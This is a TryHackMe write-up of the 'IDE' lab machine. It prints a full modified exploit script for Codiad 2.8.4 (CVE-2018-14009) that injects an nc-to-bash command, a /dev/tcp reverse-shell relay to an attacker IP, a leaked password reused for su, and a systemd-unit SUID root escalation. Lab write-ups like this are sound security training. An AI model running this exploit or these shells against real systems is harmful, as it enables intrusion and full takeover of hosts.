# 🖥️ IDE

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `10.114.168.17` |
| **OS** | Ubuntu 18.04 |
| **Attack Surface** | Anonymous FTP credential leak, Codiad 2.8.4 RCE (CVE-2018-14009) |
| **Privesc** | Writable `vsftpd.service` unit file → SUID `/bin/bash` |

Anonymous FTP exposes a hidden directory containing a note from `drac` to `john` hinting at a reset default password. That credential unlocks Codiad 2.8.4 on port 62337, exploited via CVE-2018-14009 for an authenticated RCE delivering a `www-data` shell. A world-readable `.bash_history` in `drac`'s home leaks MySQL credentials reused for lateral movement via `su`. `drac` can restart the `vsftpd` service through `sudo`, and the `vsftpd.service` systemd unit file is group-writable by `drac` — injecting `ExecStartPre=/bin/chmod +s /bin/bash` and triggering the restart sets the SUID bit, escalating to root.

---

## 🔍 Enumeration

### Port Scan

```bash
nmap -sC -sV -p- -vv -oA 10.114.168.17-tcpscan-full 10.114.168.17
nmap -sU -vv -oA udpscan-10.114.168.17 10.114.168.17
```

```
21/tcp    open  ftp     vsftpd 3.0.3   — anonymous login allowed
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache 2.4.29  — default page
62337/tcp open  http    Apache 2.4.29  — Codiad 2.8.4
```

UDP returned only `68/udp open|filtered dhcpc` — nothing actionable.

### FTP — Anonymous Login

```bash
ftp
ftp> open ide
# Name: anonymous
# Password: (blank)
ftp> ls -lah
```

```
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
```

A directory named `...` (three dots) hides in plain sight — `ls` without flags won't show it. Inside is a file named `-`:

```bash
ftp> cd ...
ftp> ls -lah
# -rw-r--r--    1 0        0             151 Jun 18  2021 -
ftp> get -
```

`cd -` fails (shell interprets it as "previous directory"), but `get -` retrieves the file directly. Contents:

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

Credentials inferred: `john` / `password`.

### Web Enumeration — Port 80

```bash
ffuf -u http://ide/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
ffuf -u http://ide/FUZZ -w ./Web-Content/raft-medium-files.txt -ic
```

Apache default page only. `index.html` returns 200; everything else is either 403 or absent. Dead end.

### Codiad 2.8.4 — Port 62337

```bash
curl -sk http://ide:62337/ | grep -i codiad
# <title>Codiad 2.8.4</title>
```

```bash
searchsploit codiad
```

```
Codiad 2.8.4 - Remote Code Execution (Authenticated)    | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)| multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)| multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)| multiple/webapps/50474.txt
```

CVE-2018-14009 — authenticated RCE via search string injection in the file manager.

---

## 💀 Initial Access — Codiad 2.8.4 RCE (CVE-2018-14009)

### Login as john

Validated the inferred credential against Codiad's auth endpoint:

```http
POST /components/user/controller.php?action=authenticate HTTP/1.1
Host: ide:62337
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username=john&password=password&theme=default&language=en
```

```json
{"status":"success","data":{"username":"john"}}
```

### Exploit

`49902.py` was modified to drop the PowerShell payload and replace it with a `nc` pipe — cleaner for Linux targets and avoids the PowerShell dependency entirely:

```python
# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
# Discovery by: WangYihang
# Vendor Homepage: http://codiad.com/
# Software Links : https://github.com/Codiad/Codiad/releases
# Tested Version: Version: 2.8.4
# CVE: CVE-2018-14009

#!/usr/bin/env python
# encoding: utf-8
import requests
import sys
import json
session = requests.Session()

def login(domain, username, password):
    global session

    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username": username,
        "password": password,
        "theme": "default",
        "language": "en"
    }

    response = session.post(url, data=data, verify=False)
    content = response.text

    print("[+] Login Content : %s" % (content))

    if 'status":"success"' in content:
        return True
    
def get_write_able_path(domain):
    global session
    
    url = domain + "/components/project/controller.php?action=get_current"
    response = session.get(url, verify=False)
    content = response.text
    
    print("[+] Path Content : %s" % (content))
    json_obj = json.loads(content)
    
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False
    
def exploit(domain, host, port, path):
    global session
    url = domain + \
        "components/filemanager/controller.php?type=1&action=search&path=%s" % (
            path)
    
    # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
    payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
    payload = "search_string=Hacker&search_file_type=" + payload
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    response = session.post(url, data=payload, headers=headers, verify=False)
    content = response.text
    print(content)

def promote_yes(hint):
    print(hint)
    while True:
        ans = input("[Y/n] ").lower()
        if ans == 'n':
            return False
        elif ans == 'y':
            return True
        else:
            print("Incorrect input")

def main():
    if len(sys.argv) != 6:
        print("Usage : ")
        print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0]))
        print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0]))
        print("Example : ")
        print("        python %s http://localhost/ admin admin 8.8.8.8 8888" % (sys.argv[0]))
        exit(1)

    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    host = sys.argv[4]
    port = int(sys.argv[5])

    print("[+] Please execute the following command on your vps: ")
    print("echo 'bash -c \"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\"' | nc -lnvp %d" % (host, port + 1, port))
    print("nc -lnvp %d" % (port + 1))
    if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
        exit(1)

    print("[+] Starting...")
    
    if not login(domain, username, password):
        print("[-] Login failed! Please check your username and password.")
        exit(2)
    
    print("[+] Login success!")
    print("[+] Getting writeable path...")
    path = get_write_able_path(domain)
    
    if path == False:
        print("[+] Get current path error!")
        exit(3)
    
    print("[+] Writeable Path : %s" % (path))
    print("[+] Sending payload...")

    exploit(domain, host, port, path)

    print("[+] Exploit finished!")
    print("[+] Enjoy your reverse shell!")

if __name__ == "__main__":
    main()
```

The key change is the `exploit()` payload line. The `%0A` injects a newline into the `search_file_type` parameter, causing Codiad's file manager to execute `nc <host> <port>|/bin/bash` as a shell command. The `#` comments out everything after it. The original PowerShell variant is left commented out above for reference.

The exploit requires two listeners before execution — the first catches an nc callback and relays a bash reverse shell command back to the target; the second receives the resulting shell:

```bash
# Terminal 1 — relay listener
echo 'bash -c "bash -i >/dev/tcp/192.168.204.251/4445 0>&1 2>&1"' | nc -lnvp 4444

# Terminal 2 — shell listener
nc -lnvp 4445
```

```bash
python3 ex.py http://ide:62337/ john password 192.168.204.251 4444
```

```
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

Shell caught as `www-data`.

### Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo
fg
stty rows 46 cols 126
export TERM='xterm'
```

---

## 🔁 Privilege Escalation

### www-data → drac (Credential Reuse via .bash_history)

`drac`'s home directory is world-readable:

```bash
ls -lah /home/drac
```

```
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
```

```bash
cat /home/drac/.bash_history
```

```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

Password reused directly for `su`:

```bash
su - drac
# Password: Th3dRaCULa1sR3aL
```

```bash
cat user.txt
# 02930d21a8eb009f6d26361b2d24a466
```

### drac → root (Writable systemd Unit File + sudo)

```bash
sudo -l
```

```
User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

Locate the service unit file:

```bash
find / -type f -iname vsftpd.service 2>/dev/null
# /lib/systemd/system/vsftpd.service

ls -l /lib/systemd/system/vsftpd.service
# -rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```

Group `drac` has write access. Inject `ExecStartPre` to SUID `/bin/bash`:

```ini
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
#ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
ExecStartPre=/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
```

Reload systemd so it picks up the modified unit, then trigger the restart:

```bash
systemctl daemon-reload
sudo /usr/sbin/service vsftpd restart
```

```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash

/bin/bash -p
```

```bash
bash-4.4# cat /root/root.txt
# ce258cb16f47f1c66f0b0b77f4e0fb8d
```

---

## 🗺️ Attack Chain

```
[Anonymous FTP]
    hidden dir "..." → file "-" → note: john / default password
          │
          ▼
[Codiad 2.8.4 — port 62337]
    john:password → authenticated → CVE-2018-14009 search string injection
    nc relay → bash -i reverse shell → www-data
          │
          ▼
[/home/drac/.bash_history]
    mysql command → Th3dRaCULa1sR3aL → su drac
          │
          ▼
[sudo + writable vsftpd.service]
    ExecStartPre=/bin/chmod +s /bin/bash
    systemctl daemon-reload → sudo service vsftpd restart
    /bin/bash -p → root
```

---

## 📌 Key Takeaways

- Hidden FTP directories (`...`) and files named `-` are deliberate obfuscation tricks — always use `ls -lah` and retrieve files by name rather than relying on `cd`
- "Reset to default password" notes in anonymous-readable locations are as good as plaintext credentials — enumerate FTP even when it looks empty
- `.bash_history` is regularly overlooked but frequently contains credentials; check it immediately when landing in any readable home directory
- Writable systemd unit files with a sudo restart path are a clean privesc vector — `ExecStartPre` runs as root before the service starts, making it ideal for injecting one-shot commands like `chmod +s`
- `systemctl daemon-reload` is required before `service restart` picks up a modified unit file — skipping it means the old definition runs and the exploit silently fails
